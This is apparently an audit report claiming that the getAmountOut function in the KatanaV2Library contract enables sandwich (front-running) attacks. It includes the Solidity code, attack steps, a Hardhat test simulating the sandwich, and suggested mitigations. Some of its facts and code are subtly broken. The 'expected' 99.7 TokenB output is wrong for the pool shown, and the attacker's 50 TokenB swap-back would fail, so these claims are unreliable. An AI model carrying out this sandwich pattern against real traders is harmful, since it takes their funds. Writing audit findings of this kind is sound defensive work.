# Vulnerability details

## Proof of Concept
In the `KatanaV2Library`, the `getAmountOut` function calculates the output of a swap based on the current reserves of a liquidity pool. However, since this calculation is deterministic and based on publicly observable on-chain data (input amount and reserves), an attacker can manipulate the reserves just before the transaction to change the outcome of the user's trade. This attack is called a front-running or sandwich attack.
https://github.com/ronin-chain/katana-v3-contracts/blob/03c80179e04f40d96f06c451ea494bb18f2a58fc/src/periphery/libraries/KatanaV2Library.sol#L46-L57
```solidity
function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
    internal
    pure
    returns (uint256 amountOut)
{
    require(amountIn > 0, "INSUFFICIENT_INPUT_AMOUNT");
    require(reserveIn > 0 && reserveOut > 0);
    uint256 amountInWithFee = amountIn.mul(997);  // 0.3% fee
    uint256 numerator = amountInWithFee.mul(reserveOut);
    uint256 denominator = reserveIn.mul(1000).add(amountInWithFee);
    amountOut = numerator / denominator;
}
```
The reserves `reserveIn` and `reserveOut` are fetched from the pair contract before the swap, and the output is determined based on them. An attacker can alter these reserves by making transactions before the user’s trade is confirmed.

Front-running attack example:
Step 1: Attacker observes a large trade pending on the mempool (e.g., a swap of 100 TokenA for TokenB).
Step 2: Attacker makes a trade to manipulate the reserves, increasing the price for the victim.
Step 3: After the victim's trade is confirmed, the attacker reverts the reserves by swapping back, profiting from the victim’s increased slippage.

PoC:
1. Deploy the project.
2. Simulate a swap:
User tries to swap 100 TokenA for TokenB.
Attacker observes the pending transaction in the mempool.
3. Attacker's actions:
The attacker submits a transaction just before the user's swap that manipulates the reserves of TokenA and TokenB.
The attacker swaps TokenA for TokenB, increasing the price of TokenB.
The user's transaction is then executed at an inflated price.
The attacker swaps back after the user's transaction, reverting the reserves and profiting from the manipulated price.

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Front-running Attack Simulation", function () {
    let TokenA, TokenB, Factory, Router, owner, attacker, user;
    let tokenA, tokenB, factory, router;
    
    before(async function () {
        [owner, attacker, user] = await ethers.getSigners();

        // Deploy TokenA and TokenB
        TokenA = await ethers.getContractFactory("ERC20Mock");
        TokenB = await ethers.getContractFactory("ERC20Mock");
        tokenA = await TokenA.deploy("TokenA", "TKA", ethers.utils.parseEther("10000"));
        tokenB = await TokenB.deploy("TokenB", "TKB", ethers.utils.parseEther("10000"));

        // Deploy Factory and Router (AMM)
        Factory = await ethers.getContractFactory("UniswapV2Factory");
        factory = await Factory.deploy(owner.address);
        Router = await ethers.getContractFactory("UniswapV2Router02");
        router = await Router.deploy(factory.address, owner.address);

        // Provide liquidity to the pool (TokenA-TokenB)
        await tokenA.approve(router.address, ethers.utils.parseEther("1000"));
        await tokenB.approve(router.address, ethers.utils.parseEther("1000"));
        await router.addLiquidity(
            tokenA.address,
            tokenB.address,
            ethers.utils.parseEther("1000"),
            ethers.utils.parseEther("1000"),
            0, 0, owner.address, Math.floor(Date.now() / 1000) + 60
        );
    });

    it("should demonstrate front-running attack", async function () {
        // User wants to swap 100 TokenA for TokenB
        await tokenA.connect(user).approve(router.address, ethers.utils.parseEther("100"));
        
        // Attacker manipulates the reserves by swapping just before the user
        await tokenA.connect(attacker).approve(router.address, ethers.utils.parseEther("50"));
        await router.connect(attacker).swapExactTokensForTokens(
            ethers.utils.parseEther("50"),
            0,
            [tokenA.address, tokenB.address],
            attacker.address,
            Math.floor(Date.now() / 1000) + 60
        );

        // User's transaction gets executed at a higher price
        await router.connect(user).swapExactTokensForTokens(
            ethers.utils.parseEther("100"),
            0,
            [tokenA.address, tokenB.address],
            user.address,
            Math.floor(Date.now() / 1000) + 60
        );

        // Attacker swaps back to profit from the price difference
        await tokenB.connect(attacker).approve(router.address, ethers.utils.parseEther("50"));
        await router.connect(attacker).swapExactTokensForTokens(
            ethers.utils.parseEther("50"),
            0,
            [tokenB.address, tokenA.address],
            attacker.address,
            Math.floor(Date.now() / 1000) + 60
        );

        // Check user's balance - should show a loss due to the front-running
        const userBalanceAfter = await tokenB.balanceOf(user.address);
        console.log("User TokenB Balance After: ", ethers.utils.formatEther(userBalanceAfter));
    });
});
```
Expected output:
- Before the front-running attack:
The user would receive approximately `99.7 TokenB` from the swap (with a 0.3% fee).
- After the front-running attack:
Due to the manipulated reserves, the user may only receive 95 TokenB or less.
The attacker profits by exploiting the price movement caused by the user's large transaction.

Front-running can cause users to receive fewer tokens than expected, leading to direct financial losses.
An attacker can manipulate token prices, damaging the reputation of the protocol.

This vulnerability can lead to significant financial losses for users. Since front-running is a well-known attack in decentralized finance (DeFi) and can be automated using bots, the risk of exploitation is very high.

## Recommended Mitigation Steps
1. Use private transaction relays, such as Flashbots, to prevent pending transactions from being observed in the mempool. This can significantly reduce the likelihood of front-running attacks.
2. Ensure that users can specify a slippage tolerance (e.g., the maximum acceptable price deviation) for their trades. If the slippage exceeds this tolerance due to front-running, the transaction would revert.
3. Implement time-locked orders that force the attacker to hold liquidity for a longer period, making it less attractive to execute quick front-running trades.
4. Introduce random delays or other methods to obscure the exact timing of swaps, making it harder for attackers to predict when to front-run.
